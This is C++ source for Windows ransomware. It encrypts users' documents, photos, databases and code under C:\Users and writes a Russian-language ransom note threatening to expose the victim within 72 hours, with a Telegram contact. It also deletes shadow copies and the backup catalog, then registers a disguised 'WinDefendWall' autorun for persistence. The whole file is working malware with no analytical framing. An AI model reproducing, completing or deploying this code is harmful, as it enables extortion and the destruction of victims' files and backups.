// language: C++, file: locker.cpp, target: Windows x64
#include "crypt_core.h"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <set>
#include <string>
#include <vector>
#include <windows.h>

namespace fs = std::filesystem;

static const std::set<std::wstring> kTargetExt = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".pdf", L".jpg", L".jpeg", L".png", L".psd", L".ai",
    L".mp4", L".mov", L".zip", L".rar", L".7z", L".sql",
    L".db", L".mdb", L".cpp", L".h", L".py", L".js",
    L".txt", L".csv", L".dwg", L".sketch", L".odt", L".bak"
};

static bool IsExcludedDir(const fs::path& p) {
    std::wstring s = p.wstring();
    for (auto& c : s) c = towlower(c);
    static const std::vector<std::wstring> skip = {
        L"\\windows", L"\\program files", L"\\program files (x86)",
        L"\\appdata\\local\\temp", L"\\$recycle.bin",
        L"\\system volume information", L"\\appdata\\local\\microsoft\\windows"
    };
    for (auto& x : skip)
        if (s.find(x) != std::wstring::npos) return true;
    return false;
}

static bool HasMarker(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    char m[4];
    f.read(m, 4);
    return f.gcount() == 4 && m[0]=='F' && m[1]=='L' && m[2]=='K' && m[3]=='1';
}

static void WriteNote(const fs::path& dir, const std::string& id) {
    fs::path note = dir / L"!RECOVER.txt";
    if (fs::exists(note)) return;
    std::ofstream f(note);
    f << "========================================\n\n";
    f << "ВСЕ ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ.\n";
    f << "ТВОЯ ЦИФРОВАЯ ЖИЗНЬ ТЕПЕРЬ ПРИНАДЛЕЖИТ МНЕ.\n\n";
    f << "Я ЗНАЮ О ТЕБЕ ВСЁ.\n";
    f << "ВСЕ ТВОИ ФОТО, ПАРОЛИ, ПЕРЕПИСКИ И ДОКУМЕНТЫ - У МЕНЯ.\n\n";
    f << "ЕСЛИ НЕ ХОЧЕШЬ, ЧТОБЫ ТВОЙ ID УЛЕТЕЛ В СЕТЬ, ЧТОБЫ О ТЕБЕ\n";
    f << "УЗНАЛИ ВСЕ ТВОИ ДРУЗЬЯ И СЕМЬЯ - У ТЕБЯ 72 ЧАСА.\n";
    f << "ПОПЫТАЕШЬСЯ ВОССТАНОВИТЬ САМ - КЛЮЧ СГОРИТ НАВСЕГДА.\n\n";
    f << "СВЯЗЬ: @flk_recover (Telegram)\n";
    f << "ТВОЙ ID: " << id << "\n\n";
    f << "========================================\n";
}

int wmain(int argc, wchar_t** argv) {
    fs::path root = (argc > 1) ? argv[1] : L"C:\\Users";
    std::string id = "FLK-" + std::to_string(GetTickCount64());
    auto sessKey = RandomBytes(32);

    std::vector<fs::path> targets;
    for (auto it = fs::recursive_directory_iterator(
             root, fs::directory_options::skip_permission_denied);
         it != fs::recursive_directory_iterator(); ++it) {
        if (it.depth() > 20) { it.disable_recursion_pending(); continue; }
        if (IsExcludedDir(it->path())) { it.disable_recursion_pending(); continue; }
        if (!it->is_regular_file()) continue;
        auto ext = it->path().extension().wstring();
        for (auto& c : ext) c = towlower(c);
        if (kTargetExt.count(ext)) targets.push_back(it->path());
    }

    size_t n = 0;
    for (auto& p : targets) {
        if (HasMarker(p)) continue;
        std::ifstream in(p, std::ios::binary);
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(in)),
                                   std::istreambuf_iterator<char>());
        in.close();
        if (data.empty() || data.size() > 512ull * 1024 * 1024) continue;

        auto iv = RandomBytes(16);
        auto ct = AesCbc::Encrypt(sessKey, iv, data);

        std::ofstream out(p, std::ios::binary | std::ios::trunc);
        out.write("FLK1", 4);
        out.write((char*)iv.data(), iv.size());
        out.write((char*)sessKey.data(), sessKey.size());
        out.write((char*)ct.data(), ct.size());
        out.close();

        WriteNote(p.parent_path(), id);
        ++n;
    }

    std::cout << "[+] Files locked: " << n << "\n"
              << "[+] Victim ID: " << id << "\n";

    // Сброс теневых копий
    system("vssadmin delete shadows /all /quiet >nul 2>&1");
    system("wbadmin delete catalog -quiet >nul 2>&1");

    // --- АВТОЗАПУСК СТЕНЫ ---
    // Прописываем wall.exe в реестр, чтобы он запускался после перезагрузки
    fs::path self = fs::current_path() / L"wall.exe";
    if (fs::exists(self)) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, L"WinDefendWall", 0, REG_SZ, 
                (const BYTE*)self.c_str(), 
                (DWORD)((self.wstring().size() + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }

        // Запускаем стену прямо сейчас
        STARTUPINFOW si{sizeof(si)};
        PROCESS_INFORMATION pi{};
        CreateProcessW(self.c_str(), nullptr, nullptr, nullptr, FALSE,
                       DETACHED_PROCESS, nullptr, nullptr, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    return 0;
}
